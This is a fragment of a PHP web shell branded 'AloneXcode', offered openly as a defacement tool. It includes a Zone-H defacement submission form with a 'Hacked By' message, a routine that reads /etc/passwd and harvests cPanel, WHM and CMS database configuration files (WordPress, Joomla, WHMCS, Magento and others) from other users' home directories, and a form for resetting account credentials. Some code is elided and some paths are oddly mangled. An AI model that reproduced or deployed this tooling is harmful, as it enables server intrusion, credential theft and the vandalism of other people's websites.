...
<title>Welcome To AloneXcode </title>
...
resize: none;
background-color: #000000;
          background-image: url(https://e.top4top.io/p_1953gcdzg0.jpg);
          background-repeat: no-repeat;
          background-attachment: fixed;
          background-size: 100%  100%;   
color: #ffffff;
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">xXx  Welcome To AloneXcode  xXx</font><br>
</h1></center>
<center><b><font face="courier new" color="white" size="5">â€œ Enjoy Deface Bro XixiXi â€</font></b></center>
...
+ Coded By   <td>: <font color='lime'> Alone | Silent Because Of Yourself<tr><td><font color='white'>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./AloneXcode'><br>
		<u>Domains</u>: <br>
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./AloneXcode</textarea><br>
...
echo "</div>";
 ...
 $idx = mkdir("./AloneXcode_CONFIG", 0777);
 $isi_htc = "Options all\nRequire None\nSatisfy Any";
 $htc = fopen("./AloneXcode_CONFIG/.htaccess","w");
 fwrite($htc, $isi_htc);
 while($passwd = fgets($etc)) {
 if($passwd == "" || !$etc) {
 ...
 $user_config_dir = "/home/$user_./AloneXcode/public_html/";
 if(is_readable($user_config_dir)) {
 $grab_config = array(
 "/home/$user_./AloneXcode/.my.cnf" => "cpanel",
 "/home/$user_./AloneXcode/.accesshash" => "WHM-accesshash",
 "/home/$user_./AloneXcode/public_html/vdo_config.php" => "Voodoo",
 "/home/$user_./AloneXcode/public_html/bw-configs/config.ini" => "BosWeb",
 "/home/$user_./AloneXcode/public_html/config/koneksi.php" => "Lokomedia",
 "/home/$user_./AloneXcode/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
 "/home/$user_./AloneXcode/public_html/clientarea/configuration.php" => "WHMCS",
 "/home/$user_./AloneXcode/public_html/whm/configuration.php" => "WHMCS",
 "/home/$user_./AloneXcode/public_html/whmcs/configuration.php" => "WHMCS",
 "/home/$user_./AloneXcode/public_html/forum/config.php" => "phpBB",
 "/home/$user_./AloneXcode/public_html/sites/default/settings.php" => "Drupal",
 "/home/$user_./AloneXcode/public_html/config/settings.inc.php" => "PrestaShop",
 "/home/$user_./AloneXcode/public_html/app/etc/local.xml" => "Magento",
 "/home/$user_./AloneXcode/public_html/joomla/configuration.php" => "Joomla",
 "/home/$user_./AloneXcode/public_html/configuration.php" => "Joomla",
 "/home/$user_./AloneXcode/public_html/wp/wp-config.php" => "WordPress",
 "/home/$user_./AloneXcode/public_html/wordpress/wp-config.php" => "WordPress",
 "/home/$user_./AloneXcode/public_html/wp-config.php" => "WordPress",
 "/home/$user_./AloneXcode/public_html/admin/config.php" => "OpenCart",
 "/home/$user_./AloneXcode/public_html/slconfig.php" => "Sitelok",
 "/home/$user_./AloneXcode/public_html/application/config/database.php" => "Ellislab");
...
Set User & Pass: <br>
<input type='text' name='user_baru' value='./AloneXcode' placeholder='user_baru'><br>
<input type='text' name='pass_baru' value='./AloneXcode' placeholder='pass_baru'><br>
<input type='submit' name='hajar' value='Gass!' style='width: 215px;'>
</form>
...
echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
 ...
 <td>
 <center>
 <h2 style='color'blue'>AloneXcode</font></h2>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Copyright &copy;2020 "AloneXcode" |  Always30</center>
</body>
</html>';
function perms($file){
